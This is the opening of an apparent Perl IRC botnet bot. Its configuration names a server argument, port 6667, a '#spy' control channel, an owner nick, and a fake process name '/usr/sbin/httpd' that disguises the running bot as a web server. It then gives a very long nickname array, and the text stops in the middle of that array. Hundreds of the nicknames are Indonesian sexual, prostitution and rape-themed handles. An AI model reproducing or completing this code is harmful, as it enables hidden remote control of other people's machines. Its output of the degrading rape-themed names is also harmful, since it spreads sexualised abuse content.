#!/usr/bin/perl

######################
my $server = $ARGV[0];
my $port="6667";
my $channel="#spy";
my $owner= "CopLaX`s";
my $procname="/usr/sbin/httpd";
######################

my @nickname = ("Abdulrazak","Ackerman","Adams","Addison","Adelstein","Adibe","Adorno","Ahlers","Alavi","Alcorn","Alda",
"Aleks","Allison","Alongi","Altavilla","Altenberger","Altenhofen","Amaral","Amatangelo","Ameer","Amsden","Anand","Andel",
"Ando","Andrelus","Andron","Anfinrud","Ansley","Anthony","Antos","Arbia","Arduini","Arellano","Aristotle","Arjas","Arky","Atkins",
"Augustus","Aurelius","Axelrod","Axworthy","Ayiemba","Aykroyd","Ayling","Azima","Bachmuth","Backus","Bady","Baglivo","Bagnold",
"Bailar","Bakanowsky","Baleja","Ballatori","Ballew","Baltz","Banta","Barabesi","Barajas","Baranczak","Baranowska","Barberi","Barbetti",
"Barneson","Barnett","Barriola","Barry","Bartholomew","Bartolome","Bartoo","Basavappa","Bashevis","Batchelder","Baumiller","Bayles","Bayo",
"Beacon","Beal","Bean","Beckman","Beder","Bedford","Behenna","Belanger","Belaoussof","Belfer","Belin-Collart","Bellavanco","Bellhouse",
"Bellini","Belloc","Benedict-Dye","Bergson","Berke-Jenkins","Bernardo",        "Bernassola","Bernston","Berrizbeitia","Betti","Beynart","Biagioli",
"Bickel","Binion","Bir","Bisema","Bisho","Blackbourn","Blackwell","Blagg","Blakemore","Blanke","Bliss","Blizard","Bloch","Bloembergen",
"Bloemhof","Bloxham","Blyth","Bolger","Bolick","Bollinger","Bologna","Boner","Bonham","Bonifaco","Bontempo","Book","Bookbinder","Boone",
"Boorstin","Borack","Borden","Bossi","Bothman","Botosh","Boudin","Boudrot","Bourneuf","Bowers","Boxer","Boyajian","Boyes","Boyland",
"Boym","Boyne","Bracalente","Bradac","Bradach","Brecht","Breed","Brenan","Brennan","Brewer","Brewer","Bridgeman","Bridges","Brinton",
"Britz","Broca","Brook","Brzycki","Buchan","Budding","Bullard","Bunton","Burden","Burdzy","Burke","Burridge","Busetta","Byatt","Byerly",
"Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo",
"Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh",
"Cavell","conicoros","corioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz",
"Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicoro","Cifarelli",
"Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton",
"Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen",
"Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapico","D'arcangelo","Das",
"Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon",
"Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
"Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland",
"Drinker","D'souza","Duffin","Durrett","Dussault","Dwyer","Eardley","Ebeling","Eckel","Edley","Edner","Edward","Eickenhorst","Eliasson",
"Elmendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erdos","Erez","Espinoza","Estes","Etter","Euripides",
"Everett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Farren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman",
"Fernald","Fernandes","Ferrante","Ferriell","Feuer","Fido","Field","Fink","Finkelstein","Finnegan","Fiorina","Fisk","Fitzmaurico","Flier",
"Flores","Folks","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Franklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich",
"Fried","Friedland","Frisken","Frowiss","Fryberger","Frye","Fujii-Abe","Fuller","Furth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey",
"Gambini","Garfield","Garman","Garonna","Geller","Gemberling","Georgi","Gerrett","Ghorai","Gibbens","Gibson","Gilbert","Gili","Gill","Gillispie",
"Gist","Gleason","Glegg","Glendon","Goldfarb","Goncalves","Good","Goodearl","Goody","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths",
"Grigoletto","Grummell","Gruner","Gruppe","Guenthart","Gunn","Guo","Ha","Haar","Hackman","Hackshaw","Haley","Halkias","Hallowell","Halpert",
"Hambarzumjan","Hamer","Hammerness","Hand","Hanssen","Harding","Hargraves","Harlow","Harrigan","Hartman","Hartmann","Hartnett","Harwell",
"Haviaras","Hawkes","Hayes","Haynes","Hazlewood","Heermans","Heft","Heiland","Hellman","Hellmiss","Helprin","Hemphill","Henery","Henrichs",
"Hernandez","Herrera","Hester","Heubert","Heyeck","Himmelfarb","Hind","Hirst","Hitchcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda",
"Holmes","Holoien","Holter","Holway","Holzman","Hooker","Hopkins","Horsley","Hoshida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper",
"Hungerford","Huntington","Hupp","Hurtubise","Hutchings","Hyde","Iaquinta","Ichikawa","Igarashi","Inamura","Inniss","Isaac","Isaievych","Isbill",
"Isserman","Iyer","Jaconko","Jackson","Jagers","Jagger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","Jay","Jeffers","Jellis",
"Jenkins","Jespersen","Jewett","Johannesson","Johannsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar",
"Kalbfleisch","Kaligian","Kalil","Kalinowski","Kalman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper",
"Keith","Kelker","Kelsey","Kempton","Kemsley","Kendall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger",
"Kirscht","Kittridge","Kleckner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Kobrick","Koch","Kohn","Koivumaki",
"Kommer","Koniaris","Konrad","Kool","Korzybski","Kotter","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar",
"Kusman","Kuwabara","La","Labunka","Lafler","Laing","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar",
"Lecco","Leclercq","Leite","Lenard","Sofia","Lesser","Lessi","Liakos","Lidano","Liem","Light","Lightfoot","Lim","Linares","Linda","Linder",
"Line","Linehan","Linzee","Lippmann","Lipponen","Little","Litvak","Livernash","Livi","Livolsi","Lizardo","Locatelli","Longworth","Loss","Loveman",
"Lowenstein","Loza","Lubin","Lucas","Luciano","Luczkow","Luecke","Lunetta","Luoma","Lussier","Lutcavage","Luzader","Ma","Maccormac","Macdonald",
"Macoachern","Macintyre","Mackenney","MacMillan","Macy","Madigan","Maggio","Mahony","Maier","Maine-Hershey","Maisano","Malatesta","Maller",
"Malova","Manalis","Mandel","Manganiello","Mantovan","March","Marchbanks","Marcus","Margalit","Margetts","Marques","Martinez","Martochio",
"Marton","Marubini","Mass","Matalka","Matarazzo","Matsukata","Mattson","Mauzy","May","Mazzali","Mazziotta","Mcbride","Mccaffery","Mccall",
"Mcclearn","Mcdowell","Mcolroy","McFadden","Mcghee","Mcgoldrick","McIlroy","Mcintosh","Mcdonald","Mclane","Mclaren","Mcnealy","Mcnulty",
"Meccariello","Memisoglu","Menzies","Merikoski","Merlani","Merminod","Merseth","Merz","Metelka","Metropolis","Meurer","Michelman","Middle",
"Mieher","Mills","Minh","Mini","Minichiello","Gonzalez","Mitropoulos","Mittal","Mocroft","Modestino","Moeller","Mohr","Moiamedi","Monque","Montilio",
"MooreDeCh.","Morani","Moreton","Morrison","Morrow","Mortimer","Mosher","Mosler","Mostafavi","Motooka","Mudarri","Muello","Mugnai","Mulkern",
"Mulroy","Mumford","Mussachio","Naddeo","Napolitano","Nardi","Nardone","Naviaux","Nayduch","Nelson","Nenna","Nesci","Neuman","Newfeld","Newlin",
"Ng","Ni","Nickerson","Nickoloff","Nisenson","Nitabach","Notman","Nuzum","Ocougne","Ogata","Oh","O'hagan","Oldford","Olsen","Olson","Olszewski",
"O'malley","Oman","O'meara","Opel","Oray","Orfield","Orsi","Ospina","Ostrowski","Ottaviani","Otten","Ouchida","Ovid","PaesDealmeida","Paine",
"Palayoor","Palepu","Pallara","Palmitesta","Panadero","Panizzon","Pantilla","Paoletti","Parmeggiani","Parris","Partridge","Pascucci","Patefield",
"Patrick","Pattullo","Pavetti","Pavlon","Pawloski","Paynter","Peabody","Pearlberg","Pederson","Peishel","Penny","Pereira","Perko","Perlak",
"Perlman","Perna","Perone","Perrimon","Peters","Petruzello","Pettibone","Pettit","Pfister","Pilbeam","Pinot","Plancon","Plant","Plasket","Plous",
"Po","Pocobene","Poincaire","Pointer","Poirier","Polak","Polanyi","Politis","Poma","Poolman","Powers","Presper","Preucol","Prevost","Pritchard",
"Pritz","Proietti","Prothrow-Stith","Puccia","Pugh","Pynchon","Quaday","Quetin","Rabe","Rabkin","Radeke","Rajagopalan","Raney","Rangan","Rankin",
"Rapple","Rayport","Redden-Tyler","Reedquist","Cunningham","Reinold","Remak","Renick","Repetto","Resnik","Rhea","Richmond","Rielly","Rindos",
"Rineer","Rish","Rivera","Robinson","Rocha","Roesler","Rogers","Ronen","Row","Royal","Ru","Ruan","Ruderman","Ruescher","Rush","Ryu","Sabatello",
"Sadler","Safire","Sahu","Sali","Samson","Sanchez-Ramirez","Sanna","Sapers","Sarin","Sartore","Sase","Satin","Satta","Satterthwaite","Sawtell",
"Sayied","Scarponi","Scopan","Scharf","Scharlemann","Scheiner","Schiano","Schifini","Schilling","Schmitt","Schossberger","Schuman","Schutte",
"Schuyler","Schwan","Schwickrath","Scovel","Scudder","Seaton","Seeber","Segal","Sekler","Selvage","Sen","Sennett","Seterdahl","Sexton",
"Seyfert","Shaikh","Shakis","Shankland","Shanley","Shar","Shatrov","Shavelson","Shea","Sheats","Shepherd","Sheppard","Shepstone","Shesko","Shia",
"Shibata","Shimon","Siesto","Sigalot","Sigini","Signa","Silverman","Silvetti","Sinsabaugh","Sirilli","Sites","Skane","Skerry","Skoda","Sloan",
"Slowe","Smilow","Sniffen","Snodgrass","Socolow","Solon","Somers","Sommariva","Sorabella","Sorg","Sottak","Soukup","Soule","Soultanian","Spanier",
"Sparrow","Spaulding","Speizer","Spenco","Sperber","Spicor","Spiegelhalter","Spiliotis","Spinrad","StMartin","Stalvey","Stam","Stang","Stassinopolus",
"States","Statlender","Stefani","Steiner","Stephanian","Stepniewska","Stewart-Oaten","Stiepock","Stillwell","Stock","Stockton","Stockwell","Stolzenberg",
"Stonich","Storer","Stott","Strange","Strauch","Streiff","Stringer","Sullivan","Sumner","Suo","Surdam","Sweeting","Sweetser","Swindle","Tagiuri",
"Tai","Talaugon","Tambiah","Tandler","Tanowitz","Tatar","Taveras","Tawn","Tcherepnin","Teague","Temes","Temmer","Tenney","Terracini","Than",
"Thavaneswaran","Theodos","Thibault","Thisted","Thomsen","Throop","Tierney","Till","Timmons","Tofallis","Tollestrup","Tolls","Tolman","Tomford",
"Toomer","Topulos","Torresi","Torske","Towler","Toye","Traebert","Trenga","Trewin","Tringali","Troiani","Troy","Truss","Tsiatis","Tsomides","Tsukurov",
"Tuck","Tudge","Tukan","Turano","Turek","Tuttle","Twells","Tzamarias","Ullman","Untermeyer","Upsdell","Urban","Urdang-Brown","Usdan","Uzuner",
"Vacca","Waite","Valberg","Valencia","Wales","Wallenberg","Walter","vanAllen","VanZwet","Vandenberg","Vanheeckeren","Warshafsky","Wasowska","Vasquez",
"Waugh","Weighart","Weingarten","Weinhaus","Weissbourd","Weissman","Velasquez","Welles","Welsh","Wengret","Venne","Verghese","Wescott","Wetzel",
"Whately","Whilton","White","Whitla","Whittaker","Viana","Viano","Wiedersheim","Wiener","Viens","Vignola","Wilder","Wilhelm","Wilk","Wilkin","Wilkinson",
"Villarreal","Willstatter","Wilson","Vitali","Viviani","Voigt","Wolk","VonHoffman","Woo","Wooden","Woods","Woods-Powell","Vorhaus","Votey","Yacono",
"Yamane","Yankee","Yarchuk","Yates","Ybarra","Yedidia","Yesson","Yetiv","Yoffe","Yoo","Youk-See","Yu","Zachary","Zahedi","Zangwill","Zegans","Zerbini",
"Zoldak","Zucconi","Zurn","Zwiers","cow_semox-bgt","cow_genit_bgt","cow_ps_tambah_k","cow_jual_tubuh","cow_jual_daging","cow_jual_gituan","cow_rasa_nikmat",
"cow_lezat","cow_nikmattt","cow_see_my_xxx","cow_lage_xxx","cow_sk_digigit","cow_pngen_diintip","cow_sk_ngintip","cow_mulus_seksi","cow_putih_seksi",
"cow_seksi_mentek","cow_seksi_bgt","cow_imoet_seksi","cow_semalam200rb","cow_1jam300rb","cow_pake_stoking","cow_pake_daster","cow_pake_tantop",
"cow_brewok","cow_kissMe","cow_tusuk_me","cow_mw_dixXx","cow_kuning_sexy","cow_cantix_semock","cow_semock_mulus","cow_lg_matang","cow_lg_meteng",
"cow_buntingin_gw","cow_pngen_bunting","cow_jago_beranak","cow_jago_xXx","cow_fans_miyabi","cow_model_bikini","cow_sk_hardCore","cow_ganjenk",
"cow_semox-bgt","cow_genit_bgt","cow_ps_tambah_k","cow_jual_tubuh","cow_jual_daging","cow_jual_gituan","cow_rasa_nikmat","cow_lezat","cow_nikmattt",
"cow_see_my_xxx","cow_lage_xxx","cow_sk_digigit","cow_pngen_diintip","cow_sk_ngintip","cow_mulus_seksi","cow_putih_seksi","cow_seksi_mentek",
"cow_seksi_bgt","cow_imoet_seksi","cow_semalam200rb","cow_1jam300rb","cow_pake_stoking","cow_pake_daster","cow_pake_tantop","cow_brewok",
"cow_kissMe","cow_tusuk_me","cow_mw_dixXx","cow_kuning_sexy","cow_cantix_semock","cow_semock_mulus","cow_lg_matang","cow_lg_meteng","cow_buntingin_gw",
"cow_pngen_bunting","cow_jago_beranak","cow_jago_xXx","cow_fans_miyabi","cow_model_bikini","cow_sk_hardCore","cow_ganjenk","co_semox-bgt","co_genit_bgt",
"co_ps_tambah_k","co_jual_tubuh","co_jual_daging","co_jual_gituan","co_rasa_nikmat","co_lezat","co_nikmattt","co_see_my_xxx","co_lage_xxx","co_sk_digigit",
"co_pngen_diintip","co_sk_ngintip","co_mulus_seksi","co_putih_seksi","co_seksi_mentek","co_seksi_bgt","co_imoet_seksi","co_semalam200rb","co_1jam300rb",
"co_pake_stoking","co_pake_daster","co_pake_tantop","co_brewok","co_kissMe","co_tusuk_me","co_mw_dixXx","co_kuning_sexy","co_cantix_semock","co_semock_mulus",
"co_lg_matang","co_lg_meteng","co_buntingin_gw","co_pngen_bunting","co_jago_beranak","co_jago_xXx","co_fans_miyabi","co_model_bikini","co_sk_hardCore","co_ganjenk",
"co_semox-bgt","co_genit_bgt","co_ps_tambah_k","co_jual_tubuh","co_jual_daging","co_jual_gituan","co_rasa_nikmat","co_lezat","co_nikmattt","co_see_my_xxx",
"co_lage_xxx","co_sk_digigit","co_pngen_diintip","co_sk_ngintip","co_mulus_seksi","co_putih_seksi","co_seksi_mentek","co_seksi_bgt","co_imoet_seksi",
"co_semalam200rb","co_1jam300rb","co_pake_stoking","co_pake_daster","co_pake_tantop","co_brewok","co_kissMe","co_tusuk_me","co_mw_dixXx","co_kuning_sexy",
"co_cantix_semock","co_semock_mulus","co_lg_matang","co_lg_meteng","co_buntingin_gw","co_pngen_bunting","co_jago_beranak","co_jago_xXx","co_fans_miyabi",
"co_model_bikini","co_sk_hardCore","co_ganjenk","cowex_semox-bgt","cowex_genit_bgt","cowex_ps_tambah_k","cowex_jual_tubuh","cowex_jual_daging","cowex_jual_gituan",
"cowex_rasa_nikmat","cowex_lezat","cowex_nikmattt","cowex_see_my_xxx","cowex_lage_xxx","cowex_sk_digigit","cowex_pngen_diintip","cowex_sk_ngintip","cowex_mulus_seksi",
"cowex_putih_seksi","cowex_seksi_mentek","cowex_seksi_bgt","cowex_imoet_seksi","cowex_semalam200rb","cowex_1jam300rb","cowex_pake_stoking","cowex_pake_daster","cowex_pake_tantop",
"cowex_brewok","cowex_kissMe","cowex_tusuk_me","cowex_mw_dixXx","cowex_kuning_sexy","cowex_cantix_semock","cowex_semock_mulus","cowex_lg_matang","cowex_lg_meteng",
"cowex_buntingin_gw","cowex_pngen_bunting","cowex_jago_beranak","cowex_jago_xXx","cowex_fans_miyabi","cowex_model_bikini","cowex_sk_hardCore","cowex_ganjenk","cow_biasa_ja_YM",
"cow_lg_YM","cow_ol_YM","cow_online_YM","cow_ol_YM","cow_online_YM","cow_dJombLow","cow_niezt","cow_kerens","cow_cantieks","cow_setia-sedunia","cow_sby_setia","cow_mnizzzz_bgt",
"cow_setia_cr_cow","cow_super_setia","cow_manis_fs","cow_pengen_punya_cow","cow_setia-bgt","cow_jelek_setia","cow_jelek-bgt","cow_jlk_tp_setia","cow_cr_serius","cow_biasa_setia",
"cow_setiaaaa","cow_paling_maniz","cow_setia_bgtttt","cow_jojoba","cow_jomblo_cr_cow","cow_perayu_cow","co_perayu_cow","cow_perayu_cow","co_mulus_cantiq","cow_mulus_cantiq","co_mulus_cantiq",
"cow_mulus_cantiq","co_mulus_butuhhh","cow_mulus_butuhhh","co_mulus_butuhhh","cow_mulus_butuhhh","co_mw_dibayarr","co_mw_dibayarr","cow_mw_dibayarr","cow_mw_dibayarr","co_butuh-bgt",
"cow_butuh-bgt","co_butuh-bgt","cow_butuh-bgt","co_cr_pemuassss","cow_cr_pemuassss","co_cr_pemuassss","cow_cr_pemuassss","cow_cr_perjaka","co_cr_perjaka","co_cr_perjaka","cow_cr_perjaka",
"cow_penidur","co_minta_diperkosa","cow_minta_diperkosa","co_minta_diperkosa","cow_minta_diperkosa","cow_","co_ga-pake_CD","cow_ga-pake_CD","cow_ga-pake_CD","cow_","cow_","cow_",
"cow_ga-pake_bra","cow_ga-pake_bra","co_ga-pake_bra","co_bra_pink","cow_cd_pink","cow_cd_pink","cow_nungging","cow_kenikmatannn","cow_cr_gituann","cow_pengen_digituin","cow_butuhhh",
"cow_ga_kuat","cow_panas_bgt","cow_lg_pengen","cow_lage_hot","cow_demen_gituan","cow_pemerkosa","cow_pengen_gituan","cow_mw_gituan","cow_pengen_gituan","co_sk_gituan","cow_sk_bokep",
"cow_bokep","cow_bokepers","cow_site_bokep","cow_bayar_murah","cow_suka_om2","cow_butuh_pemuas","cow_butuh_pemerkosa","cow_cr_pemerkosa","cow_betah_diperkosa","cow_kuat_di-ranjang","cow_kuat_bngt",
"cow_mase_kuat","cow_pelampiasan","cow_cr_pelampiasan","cow_pemerkosa_cow","cow_pengen_nikmat","cow_cr_nikmat","cow_","cow_jual_itu","cow_di-jual","cow_murahan","cow_murahan-bgt",
"cow_cr_palanggan","cow_psk_asyik","cow_jagir","cow_jarak","cow_kalimatan","cow_cr_kenikmatan","cow_pembawa_nikmat","cow_pemerkosa","cow_mw_dinaikin","cow_lg_pengen","cow_lg_dapet",
"cow_nakal_pengen","cowex_nakal-bgt","cowex_cantik_nakal","cowex_mulus_binal","cowex_putih_mulus","cowex_pengen_dianu","cowex_anunya_mungil","cowex_itunya-kecil","cowex_ga_pake_cd",
"cowex_","cow_cr_pemuassss","cow_cr_pemerkosa","cow_bikin_anak","cowex_kupu2malam","cowek_kupu2malam","co_kupu2malam","cow_kupu2malam","cow_mw_di-anu","cow_mw_diraba","cow_mw_digituin",
"cow_pengen_digituin","cow_pengen_nikmat","cow_kenikmatan_sesaat","cow_cr_kenikmatan","cow_cr_om2","cow_mw_ama_om2","cow_mw_dipesan","cow_mw_dibayar","cow_cr_gratisan","cow_pengen_anu_cow",
"cow_lg_pengen","cow_pengen_dielus","cow_itunya_merah","cow_cr_kesenangan","cow_mulus_cr_cow","cow_mulus_bgt","cow_putih_mulus","co_cari_nikmat","cow_cari_nikmat","cow_cr_nikmat","co_cr_nikmat",
"cow_pngn_buang_virgin","co_pngn_dihajar","cow_meranjang","co_meranjang","cow_free4fun","co_free4fun","cow_penghibur_cow","co_penghibur_cow","cow_pngn_main_belakang","co_pngn_main_belakang",
"cow_pengen_nungging","co_pengen_nungging","cow_mw_main_kasar","co_mw_main_kasar","co_pngn_dinikmati","co_penjinak_cow","co_pengen_semalam","co_main_isi_pulsa","co_mw_diperkosa","co_pngen_gituan",
"co_cr_kesenangan","co_pemuas_buaya","co_pengen_jatah","co_minta_jatah","co_pengen_dipuasin","co_mw_dipuasin","co_pemuja_cow","co_mw_gituan","co_pengen_gituan","co_sk_meranjang","co_sk_ngemut",
"co_sexy-bgt","co_bokepers","co_sk_burung","co_pemuas","co_butuh_cow","co_rela_diperkosa","co_pengen_di_isep","co_ga_pakeCD","co_telanjang","co_maniax","co_cutexx","co_starone","co_sakit",
"co_semrawut","cow_korax","co_sumringah","cow_kegelapan","cow_pujangga","co_emperor","co_mutiara","cow_ratu","cow_srigala","cow_jadi_jadian","co_korek_api","co_mulitan","cow_dewaza","co_cafein",
"cow_kopi_maniz","cow_kulus","cow_dramatix","cow_tragis","cow_kenangan","cow_berbunga2","cow_seal","cow_modeling","cow_sk_gelap","co_nescafee","co_cakep-bgt","co_cantix_kul","co_pemuassss",
"co_cari_gituan","co_cari_tugas","cow_coria","co_17cute","cow_cleopatra","co_cntix_kul","co_CR_CR","cow_cr_hacker","co_cr_web_desain","co_cuanteeeeek","co_cuet_cuet","co_cute_cr_temen",
"co_cutez","co_desain","co_dunia_maya","co_Dwss_bgt","cow_Fitri_FS","co_fS_nARziEsss","co_mo_gajian","co_gembredek","co_genit_bgt","co_gi_anu_anu","co_gi_sibuk","co_hackers","co_ideal",
"co_ImoetzzzZ","co_imoot","co_imootez","co_ImUtZzZz","co_imyuth","co_informatika","co_jutek_bgt","co_kerens_fs","co_kerj_di_internet","co_lg_kesepian","cow_komputeris","cow_korea","co_kul_Cantix",
"co_kuliah_ITS","co_lebay_euy","co_linux_user","co_lynx","co_maniees","co_maniezt_girl","co_mAnIiEezzZ_jOmBlO","cow_matre","co_moesliem","co_ngeblog","cow_nightmare","co_nizzz","co_nulis_web",
"co_patah_ht","co_penulis","co_perompak","co_pinter_banget","co_pirate","co_product","co_punya_blog","co_punya_web","cow_punya_website","cow_re2","co_riZa_efEZt","cow_SAKURA_nizz","co_kebobolan",
"co_site_modeling","co_smart_plus_maniezz","co_suka_anime","coW_SWEETY","co_pinter_muasin","cowex_putih_mulus","co_mulussss","co_cri_perangsang","co_pengen_gituannn","co_smk_it","co_Pemangsa_Sby",
"cow_demen_gituan","cowex_anggun","cow_sk_bikin_anak","cow_bikini_bgt","cow_engen_lontong","cowex_crI_tMn_bAEk","coW_CutE","cow_dispro","cow_informatika","cow_jomblo_nizz","cow_sk_bgt",
"cow_anunya_mulus","cow_cr_selingkuhan","cow_teknik_industri","cow_dias_fs","cowek_belajar_web","cowek_demen_naruto","cowek_hongkong","cowek_inisial_N","cowek_japan_anime","cowek_kerj_internet",
"cowek_koleksi_movie","cowek_lg_butuh_itu","cowek_olaraga_kelamiiin","cowek_pinter","cowek_itunya_mulus","cowex_itunya_putih","cowex_korea_cakep","cowk_dJombLow","cowk_niezt","cow3k_t0mb0y","cow_kerens",
"cow_mursals","cow_brandals","cow_solo_lo","cow_ria","cow_cicak","cow_spiderman","cow_mulus_gi_pengen","cow_buaya","cow_kuliah_wk","cow_kul_unesa","cow_putih_nizz","cow_gitaris","co_sep_bgt","co_mantapp",
"co_mo_pingsan","co_pengen_mati","co_ngerjain_tugas","co_seles_nokia","co_lamru","cow_jav_model","co_av_model","co_model_bokep","co_model_jav","cow_model_av","cow_model_av","co_maria_ozawa","co_model_hot",
"cow_hot_model","co_model_mulus","co_ajak_kencan","co_kencan_semalam","co_making_love","co_pemijat","co_pijat_nikmat","co_tahan_lama","co_kuat_digilir","co_nakal_pengen","co_cr_nikmattt","co_cr_kesenangan",
"co_cr_om2_genit","co_eka_mulusss","co_mupeng_berat","co_mupeng_banget","co_tetek_gedee","co_nenen","cow_bokepers","co_artis_bokep","co_sk_bokep","co_bintang_bokep","co_sk_om2","co_mau_ma_om2",
"co_pengen_ma_om2","co_jalan_ma_om2","co_rok_mini","co_rok_pendek","co_rok_minim","co_ga_pake_rok","co_pake_stoking","co_paha_mulus","co_da2_mulus","co_da2_gede","co_da2_imut","co_jual_itu","co_jual_nikmat",
"cow_jual_jasa","cow_jalanan","cow_bad","cow_item_maniez","cow_putih_maniez","cow_kuning_maniez","cow_item_mulus","cow_kuning_mulus","cow_berbulu","cow_berbulu_pengen","cow_lg_pengennnn","cow_main_keras",
"cow_maen_ganas","cow_amature","cow_hard-Core","cow_mulus_jav","cow_av-model","cow_gunung_gede","cow_gunung_mulus","cow_lubang_buaya","cow_kupu2-malam","cow_paha_mulusss","cow_selangkangan_gatal","cow_korea_cr_cow",
"cow_bertato","cow_main_free","cow_main_ps","cow_pengen_ps","cow_penyewaan_jasa","cow_pembunuh_cow","cow_buaya_laut","cow_lubang_buaya","cow_cr_buaya","cow_DiTiduriBuaya","cow_pemuas_lelaki","cow_pemuas_cow",
"cow_pemuas_buaya","cow_pemuas_om2","cow_pemuas_pejantan","cow_cr-pejantan","cow_mw_ama_pejantan","cow_cr_mr-P","cow_demen_mr-P","cow_butuh_mr-P","cow_sk_mr-P","cow_ga_virgin","cow_hilang_virgin","cow_virgine_unlimited",
"cow_emut_mr-P","cow_perokok_coklat","cow_tumbuh_rambut","cow_tumbuh_gunung","cow_tumbuh_itunya","cow_mw_em-el","cow_bs_hub-intim","cow_mw-hub-intim","cow_pengen_hub-intim","cow_pengen_intim","cow_horrneeey","cow_gatal-itunya",
"cow_pemerkosa_om2","cow_pemerkosa_perjaka","cow_pemerkosa_jejaka","cow_pemerkosa_cow","cow_lessby","cow_lezzz","cow_cantix_less","cow_less_mulus","cow_biseeeks","cow_kuat_dikeroyok","cow_pgen_dikeroyok",
"cow_dikeroyok_cow","cow_itunya-gede","cow_itunya-gatal","cow_itunya-imoet","cow_itunya-mulus","cow_model_japan","cow_model_maniz","cow_model_anime","cow_haruna-sakura","cow_model-miyabi","cow_kalahin-miyabi","cow_panas_pengen",
"cow_pengen_hot","cow_borack","cow_ketagihan_cow","cow_ketagihan_pisang","cow_pengen_pisang","cow_pake_bra_ketat","cow_bispak-bgt","cow_mw_nungging","cow_stan_nungging","cow_stan_dogi","cow_boxer","cow_stan_samping",
"cow_pakar_bercinta","cow_mahir_bercinta","cow_pngen_bercinta","cow_mw_bercinta","cow_mau_bercinta","cow_tante2","cow_tante2-btuh","cow_tante2_cr","cow_tante2_pengen","cow_tante2_cr_cow","cow_free_ml","cow_free_bokep",
"cow_dugem_asyik","cow_ratu_dugem","cow_mw_dugem","cow_pngen_dugem","cow_lg_dugem","cow_lg_mabok","cow_cd_pink","cow_cd_merah","cow_cd_ijo","cow_cd_putih","cow_cd_transparan","cow_cd_item","cow_cd_biru","cow_pemusnah_massal",
"cow_pmusnah_cow","cow_free_video","cow_free_gituan","cow_mw_gituan-free","cow_pngen-cok-in","cow_mw_cok-in","cow_dadamulus","cow_da2Mulus","cow_bra_putih","cow_poto_model","cow_mw-date","cow_dapico","cow_tante_mira","cow_tante_robi",
"cow_tante_tati","cow_tante_tutik","cow_tutik","cow_mira","cow_vitaa","cow_eny","cow_iin","cow_eka","cow_sari","cow_linda","cow_pipit","cow_santi","cow_eva","cow_fany","cow_ely","cow_melly","cow_ester","cow_putri","cow_po3","cow_ella",
"cow_rosi","cow_inem","cow_tatik","cow_sthevani","cow_dicks","cow_dinodai","cow_ratih","cow_ajenk","cow_ajeng","cow_diah","cow_dyah","cow_marsya","cow_cantixx","cow_cantika","cow_anggi","cow_angelina","cow_indah","cow_permata","cow_dian",
"cow_pamela","cow_herlina","cow_lina","cow_nanda","cow_ananda","cow_adel","cow_adult","cow_adult_model","cow_indo_adult","cow_japan_adult","cow_sby_adult","cow_jakarta_adult","cow_modeling_adult","co_cina_cuantik","co_ckp_bngt",
"co_cr_ttm","co_CuNi3z_Fs","co_cut3","co_CuTe_SmA","co_cUtEz","co_gokiiilllll_lucu","co_less_mutz","co_zkull_ztar_one","co-CANTIK-ADUHAI","cow3x_chn","cow_1c4gals","cow_b4w3l","cow_CHNZZZ_smg","cow_im03t_bratang","cow_j0m8L0","cow_jut3x",
"cow_macan_imutz","cow_matre","coW_SWEETY","cow_Me2_CakeP","cow_19_JOMBLO","cow_17_JOMBLO","cow_18_JOMBLO","cow_20_JOMBLO","cow_21_JOMBLO'","cow_22_JOMBLO","cow_JOMBLO","cow_tanktop","cow_berdaster","cow_daster","cow_CANTIKX",
"cow_mu4niiIIeEezZZ","cow_kerenzzs","cow_phones3x","cow_show_CaM","cow_ajaib_ok","cow_aJaH_dEcH","cow_aJIP","cow_anggun","cow_apa_adanya","cow_army","cow_aSiK_aJaH","cow_asyik_girl","cow_ayu","cow_b4n9et","co_baEk_cr","co_BaEk_cuTeZ_fs",
"co_bahenol","co_barusan_jomblo","co_bibir_mungil","co_beautiful_girls","cow_beauty","cow_bebas_pa_ja","co_benci_dunia","co_bikin_gemes","co_binal","co_Bispak_Gratis","co_bRokEnheArt","co_bsa_maen_musik","co_bth_duit","co_bugil",
